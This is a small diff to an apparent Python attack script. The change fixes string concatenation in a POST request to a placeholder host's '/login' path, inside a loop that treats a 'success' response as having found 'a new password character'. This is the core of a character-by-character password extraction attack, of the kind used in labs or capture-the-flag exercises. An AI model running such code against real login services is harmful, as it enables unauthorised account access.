@@ -32,7 +32,7 @@ while not (end_flag):
 		ip = 'XX.XX.XX.XX'
 		port = 'XXX'
 		directory = '/login'
-		request = requests.post('http://'+ip+':'port+directory, data = parameters)
+		request = requests.post('http://'+ip+':'+port+directory, data = parameters)
 		
 		#if success, then we found a new password character
 		if 'success' in request.text:
